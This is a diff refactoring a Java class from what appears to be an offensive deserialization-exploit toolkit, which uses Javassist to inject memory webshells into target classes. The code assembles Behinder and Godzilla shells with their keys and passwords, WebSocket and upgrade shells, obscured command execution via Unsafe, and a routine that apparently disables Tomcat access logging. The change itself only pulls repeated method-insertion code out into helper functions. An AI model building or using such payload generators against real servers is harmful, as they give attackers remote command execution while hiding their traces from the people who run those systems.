@@ -397,18 +397,8 @@ public class Gadgets {
 		insertField(ctClass, "HEADER_VALUE", "public static String HEADER_VALUE=" + converString(HEADER_VALUE) + ";");
 
 		if ("bx".equals(type)) {
-			try {
-				ctClass.getDeclaredMethod("base64Decode");
-			} catch (NotFoundException e) {
-				ctClass.addMethod(CtMethod.make(base64Decode(BASE64_DECODE_STRING_TO_BYTE), ctClass));
-			}
-
-			try {
-				ctClass.getDeclaredMethod("getFieldValue");
-			} catch (NotFoundException e) {
-				ctClass.addMethod(CtMethod.make(base64Decode(GET_FIELD_VALUE), ctClass));
-			}
-
+			insertBase64Decode(ctClass);
+			insertGetFieldValue(ctClass);
 			insertGetMethodAndInvoke(ctClass);
 
 			if (IS_OBSCURE) {
@@ -429,12 +419,7 @@ public class Gadgets {
 			insertField(ctClass, "xc", "String xc = " + converString(GODZILLA_KEY) + ";");
 			insertField(ctClass, "PASS", "String PASS = " + converString(PASSWORD_ORI) + ";");
 
-			try {
-				ctClass.getDeclaredMethod("base64Decode");
-			} catch (NotFoundException e) {
-				ctClass.addMethod(CtMethod.make(base64Decode(BASE64_DECODE_STRING_TO_BYTE), ctClass));
-			}
-
+			insertBase64Decode(ctClass);
 			ctClass.addMethod(CtMethod.make(base64Decode(BASE64_ENCODE_BYTE_TO_STRING), ctClass));
 			ctClass.addMethod(CtMethod.make(base64Decode(MD5), ctClass));
 			ctClass.addMethod(CtMethod.make(base64Decode(AES_FOR_GODZILLA), ctClass));
@@ -494,8 +479,7 @@ public class Gadgets {
 			insertMethod(ctClass, method, base64Decode(WS_SHELL));
 		} else if ("upgrade".equals(type)) {
 			insertField(ctClass, "CMD_HEADER", "public static String CMD_HEADER = " + converString(CMD_HEADER_STRING) + ";");
-
-			ctClass.addMethod(CtMethod.make(base64Decode(GET_FIELD_VALUE), ctClass));
+			insertGetFieldValue(ctClass);
 			insertCMD(ctClass);
 			insertMethod(ctClass, method, base64Decode(UPGRADE_SHELL));
 		} else {
@@ -533,15 +517,10 @@ public class Gadgets {
 	 */
 	public static void insertCMD(CtClass ctClass) throws Exception {
 		if (IS_OBSCURE) {
-			ctClass.addMethod(CtMethod.make(base64Decode(GET_METHOD_BY_CLASS), ctClass));
 			ctClass.addMethod(CtMethod.make(base64Decode(GET_UNSAFE), ctClass));
 			ctClass.addMethod(CtMethod.make(base64Decode(TO_CSTRING_Method), ctClass));
-			ctClass.addMethod(CtMethod.make(base64Decode(GET_METHOD_AND_INVOKE_OBSCURE), ctClass));
-			try {
-				ctClass.getDeclaredMethod("getFieldValue");
-			} catch (NotFoundException e) {
-				ctClass.addMethod(CtMethod.make(base64Decode(GET_FIELD_VALUE), ctClass));
-			}
+			insertGetMethodAndInvoke(ctClass);
+			insertGetFieldValue(ctClass);
 			ctClass.addMethod(CtMethod.make(base64Decode(EXEC_CMD_OBSCURE), ctClass));
 		} else {
 			ctClass.addMethod(CtMethod.make(base64Decode(EXEC_CMD), ctClass));
@@ -556,6 +535,23 @@ public class Gadgets {
 		} catch (javassist.NotFoundException ignored) {
 		}
 		ctClass.addField(CtField.make(fieldCode, ctClass));
+	}
+
+
+	public static void insertBase64Decode(CtClass ctClass) throws Exception {
+		try {
+			ctClass.getDeclaredMethod("base64Decode");
+		} catch (NotFoundException e) {
+			ctClass.addMethod(CtMethod.make(base64Decode(BASE64_DECODE_STRING_TO_BYTE), ctClass));
+		}
+	}
+
+	public static void insertGetFieldValue(CtClass ctClass) throws Exception {
+		try {
+			ctClass.getDeclaredMethod("getFieldValue");
+		} catch (NotFoundException e) {
+			ctClass.addMethod(CtMethod.make(base64Decode(GET_FIELD_VALUE), ctClass));
+		}
 	}
 
 	public static void insertGetMethodAndInvoke(CtClass ctClass) throws Exception {
@@ -577,12 +573,7 @@ public class Gadgets {
 	}
 
 	public static void insertTomcatNoLog(CtClass ctClass) throws Exception {
-
-		try {
-			ctClass.getDeclaredMethod("getFieldValue");
-		} catch (NotFoundException e) {
-			ctClass.addMethod(CtMethod.make(base64Decode(GET_FIELD_VALUE), ctClass));
-		}
+		insertGetFieldValue(ctClass);
 		insertGetMethodAndInvoke(ctClass);
 		ctClass.addMethod(CtMethod.make(base64Decode(TOMCAT_NO_LOG), ctClass));
 	}
